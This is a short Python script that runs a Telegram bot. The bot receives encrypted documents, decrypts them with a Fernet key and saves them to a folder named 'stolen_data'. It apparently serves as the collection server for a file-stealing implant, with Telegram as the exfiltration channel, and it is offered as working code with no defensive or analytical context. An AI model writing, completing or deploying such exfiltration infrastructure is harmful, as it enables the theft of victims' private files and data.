import telebot
import os
from cryptography.fernet import Fernet

TOKEN = ""
KEY =b''
SAVE_FOLDER = "./stolen_data"

bot = telebot.TeleBot(TOKEN)
cipher_suite = Fernet(KEY)

if not os.path.exists(SAVE_FOLDER):
    os.makedirs(SAVE_FOLDER)

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        original_name = message.document.file_name.replace(".enc", "")
        save_path = os.path.join(SAVE_FOLDER, original_name)
        with open(save_path, 'wb') as new_file:
            new_file.write(cipher_suite.decrypt(downloaded_file))

        print(f"[+] Got file: {original_name}")
        bot.reply_to(message, f"Great! {original_name} I got file")

    except Exception as e:
        print(f"Помилка: {e}")

if __name__ == "__main__":
    print("[*] Server working, waiting for files ....")
    bot.polling(none_stop=True)
